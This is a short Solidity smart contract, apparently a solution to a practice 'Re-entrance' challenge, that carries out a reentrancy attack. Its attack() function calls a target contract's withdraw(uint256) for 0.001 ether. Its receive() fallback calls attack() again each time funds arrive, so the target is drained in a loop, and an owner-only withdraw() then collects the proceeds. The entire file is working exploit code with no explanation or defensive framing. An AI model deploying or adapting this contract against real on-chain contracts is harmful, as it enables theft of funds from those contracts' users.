// SPDX-License-Identifier: MIT
pragma solidity >=0.8.2 <0.9.0;

contract ReentranceAttck {
    uint public balance;
    address public reentranceAddress;
    address public owner;

    constructor(address _addr) payable  {
        reentranceAddress = _addr;
        balance = msg.value;
        owner = msg.sender;
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0x38d7ea4c68000);
        (bool success, ) = reentranceAddress.call(payload);
        require(success, "Transfer failed");
    }

    receive() external payable {
        this.attack();
    }
}